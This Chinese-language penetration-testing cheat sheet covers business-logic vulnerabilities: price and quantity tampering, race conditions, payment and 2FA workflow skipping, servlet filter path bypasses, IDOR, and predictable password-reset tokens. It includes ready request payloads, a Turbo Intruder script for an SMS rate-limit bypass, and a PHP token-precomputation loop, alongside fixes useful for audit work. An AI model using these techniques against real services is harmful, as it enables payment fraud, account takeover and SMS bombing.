## 1. 价格与数值操控

### 负数数量 / 价格
许多应用程序验证 "数量 > 0" 但不验证货币：
```
使用数量：-1 添加到购物车
更新数量到：-100
{
  "数量": -5,
  "价格": -99.99     ← 可能会被接受
}
```
**影响**：收到账户信用、免费物品、反向银行转账。

### 小数数量——“0元购”案例
真实案例：一个电子商务应用程序接受 **分数 `数量`** 因为后端信任客户端浮点值：
```json
// 购物车项：
{"id": 114016, "skuQty": 0.02}
// 原始价格 ¥500 → 最终价格 ¥10
// 外卖应用程序上的变体：
// FoodNum=0.01 → 68元 商品 实付 0.68元
```
为什么有效：服务器将 `unit_price * quantity` 相乘而不强制 `数量 ∈ Z+`，所以一个 2% 的薄片订单支付 2% 的价格但发货完整物品。通过拦截购物车提交→设置 `skuQty` / `FoodNum` 为 `0.02`→完成结账来重现。

### 移除必填字段——免费层级强制
体育活动注册：当涉及付费奖品时，服务器返回 `"payType": "paid"`；如果客户端请求**编辑为完全省略 `prizeIdList`**，服务器回退到 `"payType": "free"` 并创建一个成功的注册，而该注册本应付费。
```json
// 原始
{"prizeIdList": ["6264e6948fe587000113e2d9"], ...}
// 修改后 — 完全移除数组
{"prizeIdList": [], ...}
// 服务器响应：
{"ok": true, "payType": "free"}
```
这是一个参数存在信任漏洞——后端将“字段缺失”视为“没有需要执行的付费项目”，因此修复方法是要求该字段并在服务器端验证其内容。

### 整数溢出
```
数量：2147483648   ← INT_MAX + 1 在 32 位中溢出到负数
价格：9999999999999   ← 超出浮点精度 → 四舍五入为 0
```
真实案例：设置 `amount=999999999` 触发溢出路径，系统将 `0` 存为最终应付金额。**在触发溢出测试前务必协调**——它们有时会崩溃支付服务。

### 舍入操控
```
物品价格：$0.001
订购 1000 件→每个四舍五入→总计 = $0.00
```
真实的“半价充值”漏洞：输入 `¥0.019` 进行充值。支付网关仅收取 `¥0.01`（四舍五入到分），但钱包充值 `¥0.02`（四舍五入）。每个周期的净收益是 `¥0.01`，重复以增加免费余额。

### 货币汇率滞后
```
1. 使用货币 A 以汇率 X 进行存款
2. 汇率变化
3. 使用新的汇率以货币 A 提款 → 从汇率差异中获利
```

### 通过促销叠加进行免费升级
测试组合折扣码、推荐积分、欢迎奖励：
```
应用促销：FREE50  → 50% 折扣
应用促销：REFER10 → 额外 10%
应用忠诚度积分→额外折扣
总计：-$5（免费+信用）
```

## 2. 竞态条件

**概念**：两个操作在第一个操作完成其检查-更新周期之前同时运行。

### 双重消费 / 双重兑换
```bash
# 同时发送相同请求（约毫秒间隔）：
# 使用 Burp Repeater "发送到组" 或竞态条件工具：

POST /api/use-coupon    ← 发送 20 个并行请求
POST /api/redeem-gift   ← 相同的优惠券代码，并行
POST /api/withdraw-funds ← 相同的余额，并行

# 如果检查和更新不是原子的：
# 线程 1：检查余额 >= 100 → TRUE
# 线程 2：检查余额 >= 100 → TRUE（线程 1 扣除之前）
# 线程 1：余额 -= 100
# 线程 2：余额 -= 100 → 双重成功→双重消费
```

### 使用 Burp Suite 进行竞态条件测试
```
1. 捕获请求
2. 发送到 Repeater → 复制 20+ 次
3. "并行发送组"（Burp 2023+）
4. 检查：是否有任何重复成功？
```

### Turbo Intruder——绕过按号码的短信速率限制
真实案例：当正常请求返回 `"该号码短时间内申请发送短信次数过多，拒绝发送"` 时，通过 Turbo Intruder 以高并发发送**相同的有效载荷**可以绕过简单的计数器：
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```
结果：按号码限制器竞态，许多请求滑过，生成多个不同的验证码（一个真实的短信轰炸案例）。根本原因：计数器增量与读取非原子。

### 多设备并发 VIP 订阅
真实案例：一个服务提供 **仅限首月的折扣**。在任何支付完成之前，在多个设备（A、B、C）上打开支付表单，然后按顺序完成每个。服务器仅在**第一个**请求中检查“是否为新用户？”，因此所有后续请求都会继承折扣，并且 VIP 时长堆叠。
```
正常：下单→支付→充值会员→第二次下单→服务端校验“已是新人”→拒绝
绕过：设备A: 进入支付页（锁定优惠资格）
        设备B: 进入支付页（并发锁定）
        设备A: 完成支付→VIP +1月（优惠价）
        设备B: 完成支付→VIP +1月（仍按优惠价）
```
同样的技巧适用于“补差价升级会员”——并发充值会重复时长信用。

### 账户注册竞态
```
同时使用相同电子邮件注册→创建两个账户→数据隔离破坏
密码重置令牌竞态→重复使用相同的令牌
电子邮件验证竞态→验证多个电子邮件地址
```

### 通过竞态绕过限制
```
“一次声明”折扣、免费物品、“首次订单”奖励：
→ 发送 10 个并行 POST /claim 请求
→ 竞态窗口：所有请求在写入之前通过“已声明？”检查
```

## 3. 工作流 / 步骤绕过

### 支付流程绕过
```
正常流程：
  1. 添加到购物车
  2. 输入运输信息
  3. 输入支付（卡/钱包）
  4. 点击确认→支付
  5. 订单确认

攻击：直接跳到第 5 步
POST /api/orders/confirm {"cart_id": "1234", "payment_status": "paid"}
→ 服务器信任客户端发送的 payment_status？
```

### 多步骤验证绕过
```
密码重置流程：
  1. 输入电子邮件
  2. 接收令牌
  3. 输入令牌
  4. 设置新密码（需要有效的第 3 步令牌）

攻击：尝试在第 4 步直接跳过第 3 步：
POST /reset/password {"email": "victim@x.com", "token": "invalid", "new_pass": "hacked"}
→ 服务器检查是否正确验证了令牌？

或者：尝试使用旧/过期的流程令牌→仍然接受？
```

### 2FA 绕过
```
正常流程：
  1. 输入用户名 + 密码→成功
  2. 输入 2FA 代码→登录

攻击：在第 1 步成功后，直接访问 /dashboard
→ 是否在 2FA 完成之前创建会话？
→ /dashboard 是否需要 2FA 完成检查，还是只需要“已认证”标志？
```

### 过滤路径截断绕过——`..//` 和 `;`

真实案例来自一个 Java Web 类审计：一个手动实现的 Servlet `Filter` 通过检查 URI 字符串来检查登录。两个可靠的绕过方法：

```
路径遍历截断（../）:
  受保护：   http://target/FilterDemo/index.jsp        → 302 到 /login
  绕过：      http://target/FilterDemo/../../index.jsp  → 200 (filter 看到 "../../", URL 解析器折叠)

分号截断（;）:
  受保护：   http://target/admin/doLogin.action        → 302 到 /login
  绕过：      http://target/;/admin/doLogin.action      → 200
                              ^
                              Servlet 容器将分号后的部分视为“路径参数”，使用 `request.getRequestURI()` 的 filter 看到 "/;/admin/doLogin.action", 不匹配其受保护前缀 "/admin/"，允许请求通过，
                              但调度器随后路由到真实的 /admin/doLogin.action 处理器。
```

**修复**：永远不要使用 `request.getRequestURI()` 进行安全检查；使用 `request.getServletPath()`，它是规范化的 servlet 映射路径：
```java
// 易受攻击
String uri = request.getRequestURI();   // /;/admin/doLogin.action
// 安全
String path = request.getServletPath(); // /admin/doLogin.action
```

在审计 Java 代码时，搜索 `request.getRequestURI()` 与 `Filter`/`startsWith`/`indexOf("/admin")` 模式配对——这些都是立即的红色警告标志。

### 真实姓名验证重放至重置

欺诈性路径故意失败真实姓名认证以**重新打开**编辑流程：
```
1. 提交真实姓名认证，故意填写错误的 cardNumber
   → 服务器返回 "code:200, msg:success, ok:true" 但流程显示 "驳回 / 等待审核"
2. 因为服务器将状态标记为“已拒绝”但不会锁定用户，界面允许账户回到“编辑身份”状态
3. 现在重新提交另一个（可能是被盗的）身份
   → 真实姓名绑定无限重复，破坏了反成瘾锁定并使账户可以转售
```
防御：被拒绝的真实姓名提交必须锁定账户 / 需要人工审核，而不是回到编辑器。

  1. 添加物品到购物车

## 5. 账户 / 特权逻辑漏洞

### 邮件验证绕过
```
1. 使用电子邮件 A 注册（合法的，已验证）
2. 更改电子邮件为 B（攻击者的电子邮件，未验证）
3. 使用账户作为已验证——服务器强制重新验证吗？

或者：更改电子邮件为受害者的电子邮件→无需验证→账户声称
```

### 密码重置令牌绑定
```
1. 为您的账户请求密码重置→获得令牌
2. 更改您的电子邮件地址（账户设置）
3. 重用旧的密码重置令牌→是否仍然适用于旧的电子邮件？

或者：为 victim@target.com 请求重置
    令牌发送给受害者，但检查：URL 是否揭示可预测的令牌模式？
```

### OAuth 账户链接滥用
```
1. 拥有受害者的电子邮件（但不知道他们的密码）
2. 使用受害者的电子邮件注册→获得具有相同电子邮件的账户
3. 链接 OAuth（Google/GitHub）到您的账户
4. 受害者使用 Google 登录→服务器找到电子邮件匹配→与您的账户合并
```

### Cookie 替换——水平/垂直特权提升

教科书 IDOR 示例来自审计视频：
```
1. 以超级管理员身份登录→捕获请求，复制 Cookie (JSESSIONID/Token)
2. 注销，以普通用户身份登录→捕获另一个请求到相同的端点
3. 重放普通用户请求，但将 Cookie 值与管理员的令牌交换
4. 如果响应返回管理员专有数据→垂直提升
   如果它返回另一个用户的数据→水平提升
```
一个常见的伴随漏洞：`/oa/emp/list` 返回 **在没有 Cookie 时返回 HTTP 302 到 /login**，但在**任何普通用户 Cookie 发送时返回 200 并包含完整数据**——这意味着唯一的检查是“已登录？”，而不是“有权限访问此端点”。

### 数据库不一致的权限残留

一个微妙案例来自第二个审计课程：管理界面显示角色 X 已撤销权限 `user:list`，但查询 SQL 数据：

```sql
SELECT * FROM sys_menu WHERE role_id = 2;
-- 两条对于相同的 menu_id "user:list"
```

UI 的“移除权限”只删除了一条行；重复的行仍然保留 API 可访问性。通过验证：
```sql
SELECT menu_id, COUNT(*) FROM sys_menu GROUP BY menu_id, role_id HAVING COUNT(*) > 1;
```

教训：当 UI 说权限已撤销但 API 仍然工作→检查底层 RBAC 表是否存在重复项/孤立授权。

### 弱随机密码重置令牌

PHP / 遗留堆栈在 Windows 上使用 `rand()`，其 `RAND_MAX = 32768`。如果重置链接使用
`/resetpassword.php?id=md5(rand())`，整个密钥空间是可预计算的：
```php
$a = 0;
for ($a = 0; $a <= 32768; $a++) {
    $b = md5($a);
    echo $b . "\r\n";
}
```
迭代生成的字典与 `/resetpassword.php?id=<hash>` 对比——当其中一个返回有效的重置页面时，您可以更改受害者的密码。审计任何调用 `rand()` 的令牌生成，包括 `mt_rand()`（未播种）、`Random()`（C# 中的默认播种）等。

## 6. API 业务逻辑漏洞

### 对象状态操控
```
order.status = "pending"
→ PUT /api/orders/1234 {"status": "refunded"}   ← 自触发退款
→ PUT /api/orders/1234 {"status": "shipped"}    ← 无需运费就标记为已发货
```

### 事务重用
```
1. 启动支付 → 获取 transaction_id
2. 完成购买
3. 使用相同的 transaction_id 进行第二次购买:
   POST /api/checkout {"transaction_id": "USED_TX", "cart": "new_cart"}
```

### 限制计数操控
```
每日转账限额 = $1000
→ 转账 $999，取消，转账 $999（取消时限制未更新）
→ 并发转账（限制检查上的竞态条件）
→ 不同支付类型不共享限制计数器
```

### Java Web “无 Filter, 无 Spring Security” 反模式

审计友好的提示：一个不包含 `spring-boot-starter-security` 且没有任何 `Filter` 类的 Spring Boot 项目。这意味着每个控制器在没有开发者手动在每个方法中检查会话的情况下都是开放的。重现：
```bash
# 在源代码树内
find . -name "*.java" -exec grep -l "Filter" {} \;     # 可能是空的
find . -name "*.java" -exec grep -l "@PreAuthorize\|@Secured" {} \;
```
如果两者都为空，预期几乎每个 API 都未授权。从审计演示：
```java
public Result score(@RequestParam("userId") Integer userId) {
    Score score = scoreService.selectScoreByUserId(userId);
    return Result.success(score);
}
```
没有检查 `userId` 与会话中登录的用户匹配→水平 IDOR。更糟的是：相同的端点**无需任何 Cookie**即可工作，因为没有强制全局认证。
